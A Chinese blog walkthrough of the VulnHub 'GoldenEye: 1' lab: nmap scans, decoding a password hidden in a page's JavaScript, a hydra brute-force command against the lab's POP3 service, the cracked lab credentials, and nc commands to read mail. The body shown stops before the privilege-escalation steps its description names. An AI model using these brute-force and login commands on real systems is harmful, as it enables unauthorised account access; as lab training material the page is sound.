<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="主机发现、目标信息扫描、源码 js 文件泄露敏感信息、hydra 爆破邮件服务（pop3）、邮件泄露敏感信息、ip 与域名映射写进 hosts 文件、whatweb 工具检测网站、图片隐写分析、CVE-2013-3630 漏洞利用、python 反弹 shell、使用 ptyhon 获取 tty、CVE-2015-1328 漏洞利用、kali 本地 exp 库攻击脚本利用。">
<meta property="og:type" content="article">
<meta property="og:title" content="《VulnHub》GoldenEye：1">
<meta property="og:url" content="https://blog.lens-shrine.top/2024/02/16/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/index.html">
<meta property="og:site_name" content="镜坛">
<meta property="og:description" content="主机发现、目标信息扫描、源码 js 文件泄露敏感信息、hydra 爆破邮件服务（pop3）、邮件泄露敏感信息、ip 与域名映射写进 hosts 文件、whatweb 工具检测网站、图片隐写分析、CVE-2013-3630 漏洞利用、python 反弹 shell、使用 ptyhon 获取 tty、CVE-2015-1328 漏洞利用、kali 本地 exp 库攻击脚本利用。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/f7551274ce0c4920be84da343a494ebc.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/244960c860364f00b55b5f591fb137ff.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/ea92103aa5014d7cadebe11fbb7eff66.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/59b295c4e0014ad78816a02a5be6d474.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/63944c5485d14b4182df88c65aa73ec7.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/f445a7df273148958f9323cda46f8100.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/cf4fdfab6b344e119f0e674fbffdec7b.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/2ee1e6e8843e4c57a90632f884c5056c.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/1ac3256768b6439395c2e696a5ecbb70.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/a7dd443c63904bc282bad23cf9b952a7.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/ec7377f8213840d5b869501a49212aea.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/8ad81c277bed4e4b8a168fb79b473e94.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/7eb7ef0af9cd49eb99243aa821162e82.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/dec215a82e794fcbb3f186e3a1872e4b.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/2fc88c1857e54478827c9caf4a5cd631.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/f61a3db4d4ef4e7c9cf9b8c294b45187.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/ee4c5792eea1479888deab470e8b8e90.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/84b3c3af8bc6461faeaddc3771072de0.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/4592d6c73b6a4e9480e31b870246517f.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/442b454a515b4093802869251ddd3beb.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/6e84ddb233594a868742781b6fc4801c.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/4d312448a4eb4d23ad5dc79716e2b40a.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/6fb9613d509c4c89ada72aa898b7e75b.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/3c9ac116a8be46339a388616ce0382b3.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/3087dc8207df497080eafecd40495ef9.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/6bdbd1c74c8640b7b2a637ff3967c051.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/363a4d29ca5a4d669d2be3a8f57cc2ae.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/2e9f8e7a1c234393bae4839b3aab1846.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/c9cb249b80fa469da40ee27babebb209.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/0931e53af4f6491fa3d6f24513d9e84d.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/023aa331499c44b78e2d55672a009a4c.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/7d4fb5ac40744b47b2e6972488a03112.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/4c2465c6050f4dfd9b76da2270dddb07.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/1f216bcd0126411288e63cd0783a8844.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/e3860957f0e340a599e73139399555d3.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/49c1a5419fbc476d8ab7ed9cc03c44f5.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/d46e50c715574cc28c09a2e21f708568.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/b886f345851644dc8d4bdc1543f17b63.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/0bbd06cb0b304616bf6fbef5676e99da.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/1213295f0c74443ca18a772baa58b552.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/f12177c88ec149bd85f9a69636a93b75.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/9b1dc0d7706b4f83954b7715444fc0a9.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/9d128cc6bea94ff6afb5da0917ddfef9.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/87d9161c97e84783a43fe61d79f2878b.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/aafe42cba8474e3e887da6e7163dc605.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/7ad55d87d64d4abeaecc7f9ba1ebe770.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/0d4ca3824c6e49ec87291536e1f18282.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/5c41503eb3c64ec4b0a771e890d3163e.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/a653e56a94d847369bee89776849db2e.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/d27084c62114484889ecf6caa3c05b47.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/270f9d44fcae4cf881a4bd78351f3f01.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/f9d9323c1a46476e8d65a76c67d0efaf.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/93d5133c7d6345ad97ba578b17c71083.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/8b234f4a4e724be58b49270ac4b06eb6.png">
<meta property="article:published_time" content="2024-02-16T06:53:49.000Z">
<meta property="article:modified_time" content="2024-02-16T07:08:49.000Z">
<meta property="article:author" content="镜坛主">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/f7551274ce0c4920be84da343a494ebc.png"><title>《VulnHub》GoldenEye：1 | 镜坛</title><link ref="canonical" href="https://blog.lens-shrine.top/2024/02/16/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":2},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"dark","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: {"avoidBanner":true},
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbtack"></i></span><span class="header-nav-menu-item__text">关于</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner" style="background: url(/images/backimg/SunsetClimbing.png) no-repeat center/cover;"><div class="header-banner-info"><div class="header-banner-info__title">镜 坛</div><div class="header-banner-info__subtitle">烛明香暗画楼深，满鬓青霜残雪思难任。</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">《VulnHub》GoldenEye：1</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2024-02-16</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2024-02-16</span></span></div></header><div class="post-body"><p>@<a href="VulnHub">TOC</a></p>
<hr>
<blockquote>
<p>VulnHub 打靶记录。<br>VulnHub 官网：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.vulnhub.com/" >https://www.vulnhub.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</blockquote>
<blockquote>
<p>攻击机为 Kali-Linux-2023.3-vmware-amd64。<br>Kali NAT IP：192.168.8.15。</p>
</blockquote>

        <h1 id="1：靶场信息"   >
          <a href="#1：靶场信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#1：靶场信息" class="headerlink" title="1：靶场信息"></a>1：靶场信息</h1>
      <p>靶场地址：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/goldeneye-1,240/" >https://www.vulnhub.com/entry/goldeneye-1,240/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="2：打靶"   >
          <a href="#2：打靶" class="heading-link"><i class="fas fa-link"></i></a><a href="#2：打靶" class="headerlink" title="2：打靶"></a>2：打靶</h1>
      
        <h2 id="2-1：情报收集-威胁建模"   >
          <a href="#2-1：情报收集-威胁建模" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-1：情报收集-威胁建模" class="headerlink" title="2.1：情报收集 &amp; 威胁建模"></a>2.1：情报收集 &amp; 威胁建模</h2>
      <p><strong>主机发现</strong>：<br><code>nmap 192.168.8.0/24 -sn</code></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/f7551274ce0c4920be84da343a494ebc.png" alt="在这里插入图片描述"></p>
<p>可以确定目标 ip：192.168.8.137。</p>
<p><strong>进行端口扫描、服务探测、OS 探测</strong>：<br><code>nmap 192.168.8.137 -p- -sC -sV -O</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap 192.168.8.137 -p- -sC -sV -O </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-04 10:43 HKT</span><br><span class="line">Nmap scan report for 192.168.8.137</span><br><span class="line">Host is up (0.00089s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">25/tcp    open  smtp     Postfix smtpd</span><br><span class="line">|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=ubuntu</span><br><span class="line">| Not valid before: 2018-04-24T03:22:34</span><br><span class="line">|_Not valid after:  2028-04-21T03:22:34</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-title: GoldenEye Primary Admin Server</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">55006/tcp open  ssl/pop3 Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: SASL(PLAIN) RESP-CODES USER CAPA AUTH-RESP-CODE PIPELINING TOP UIDL</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">|_Not valid after:  2028-04-23T03:23:52</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">55007/tcp open  pop3     Dovecot pop3d</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">|_Not valid after:  2028-04-23T03:23:52</span><br><span class="line">|_pop3-capabilities: USER CAPA PIPELINING RESP-CODES TOP AUTH-RESP-CODE SASL(PLAIN) UIDL STLS</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">MAC Address: 00:0C:29:01:85:10 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 38.41 seconds</span><br></pre></td></tr></table></div></figure>

<p>先访问 80 端口看看。</p>
<p>给出了一个登录地址。查看源码还可以发现一个 js 文件。</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/244960c860364f00b55b5f591fb137ff.png" alt="在这里插入图片描述"></p>
<p>terminal.js 内容如下。</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/ea92103aa5014d7cadebe11fbb7eff66.png" alt="在这里插入图片描述"></p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">GoldenEyeText</span>: <span class="string">&quot;&lt;span&gt;&lt;br/&gt;Severnaya Auxiliary Control Station&lt;br/&gt;****TOP SECRET ACCESS****&lt;br/&gt;Accessing Server Identity&lt;br/&gt;Server Name:....................&lt;br/&gt;GOLDENEYE&lt;br/&gt;&lt;br/&gt;User: UNKNOWN&lt;br/&gt;&lt;span&gt;Naviagate to /sev-home/ to login&lt;/span&gt;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//Boris, make sure you update your default password. </span></span><br><span class="line"><span class="comment">//My sources say MI6 maybe planning to infiltrate. </span></span><br><span class="line"><span class="comment">//Be on the lookout for any suspicious network traffic....</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//I encoded you p@ssword below...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//BTW Natalya says she can break your codes</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> allElements = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;typeing&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; allElements.<span class="property">length</span>; j++) &#123;</span><br><span class="line">  <span class="keyword">var</span> currentElementId = allElements[j].<span class="property">id</span>;</span><br><span class="line">  <span class="keyword">var</span> currentElementIdContent = data[<span class="number">0</span>][currentElementId];</span><br><span class="line">  <span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(currentElementId);</span><br><span class="line">  <span class="keyword">var</span> devTypeText = currentElementIdContent;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>, isTag, text;</span><br><span class="line">  (<span class="keyword">function</span> <span class="title function_">type</span>(<span class="params"></span>) &#123;</span><br><span class="line">    text = devTypeText.<span class="title function_">slice</span>(<span class="number">0</span>, ++i);</span><br><span class="line">    <span class="keyword">if</span> (text === devTypeText) <span class="keyword">return</span>;</span><br><span class="line">    element.<span class="property">innerHTML</span> = text + <span class="string">`&lt;span class=&#x27;blinker&#x27;&gt;&amp;#32;&lt;/span&gt;`</span>;</span><br><span class="line">    <span class="keyword">var</span> char = text.<span class="title function_">slice</span>(-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (char === <span class="string">&quot;&lt;&quot;</span>) isTag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (char === <span class="string">&quot;&gt;&quot;</span>) isTag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (isTag) <span class="keyword">return</span> <span class="title function_">type</span>();</span><br><span class="line">    <span class="built_in">setTimeout</span>(type, <span class="number">60</span>);</span><br><span class="line">  &#125;)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>访问登录地址。</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/59b295c4e0014ad78816a02a5be6d474.png" alt="在这里插入图片描述"></p>
<p>terminal.js 文件中的 html 编码字符串解密如下：</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/63944c5485d14b4182df88c65aa73ec7.png" alt="在这里插入图片描述"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span><br><span class="line">InvincibleHack3r</span><br></pre></td></tr></table></div></figure>

<p>除此以外从 js 文件中还可以得到两个名字：Boris、Natalya。</p>
<p>以此尝试一下登录，最终得到用户名与密码：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: boris</span><br><span class="line">password: InvincibleHack3r</span><br></pre></td></tr></table></div></figure>

<p>登录后页面如下，提示了可能需要从 pop3 服务入手。</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/f445a7df273148958f9323cda46f8100.png" alt="在这里插入图片描述"></p>
<p>那就尝试爆破一下邮件服务密码。</p>
<p>将要使用的用户名写入文件。<br><code>echo -e &#39;boris\nnatalya&#39; &gt; name.txt</code></p>
<p><strong>使用 hydra 爆破 pop3</strong>。<br><code>hydra -L name.txt -P /usr/share/wordlists/fasttrack.txt 192.168.8.137 -s 55007 pop3</code></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/cf4fdfab6b344e119f0e674fbffdec7b.png" alt="在这里插入图片描述"></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/2ee1e6e8843e4c57a90632f884c5056c.png" alt="在这里插入图片描述"></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/1ac3256768b6439395c2e696a5ecbb70.png" alt="在这里插入图片描述"></p>
<p>爆破出了两个账户。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login: boris     password: secret1!</span><br><span class="line">login: natalya   password: bird</span><br></pre></td></tr></table></div></figure>

<p>接下来可以<strong>通过 nc 登录 pop3 查看邮件</strong>。</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.8.137 55007    # 登录邮箱</span><br><span class="line">user boris                    # 登录用户</span><br><span class="line">pass secret1!                 # 登录密码</span><br><span class="line">list                          # 查看邮件数量</span><br><span class="line">retr 1                        # 查看邮件内容</span><br></pre></td></tr></table></div></figure>

<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/a7dd443c63904bc282bad23cf9b952a7.png" alt="在这里插入图片描述"></p>
